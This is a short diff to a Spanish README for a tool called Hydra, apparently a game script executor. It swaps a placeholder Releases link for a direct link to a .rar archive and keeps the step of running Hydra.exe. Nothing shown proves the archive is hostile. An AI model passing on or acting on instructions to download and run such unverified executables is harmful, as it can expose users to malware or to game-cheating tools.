@@ -36,7 +36,7 @@
 ## 🎮 Cómo Usar
 
 ### Instalación
-1. Descarga la última versión desde [Releases](https://github.com/TU_USUARIO/Hydra/releases)
+1. Descarga la última versión desde [Releases](https://github.com/Ades12121212121/HydraExecutor/releases/download/Executor/1.1.0.rar)
 2. Ejecuta `Hydra.exe`
 3. ¡Listo para usar!
 
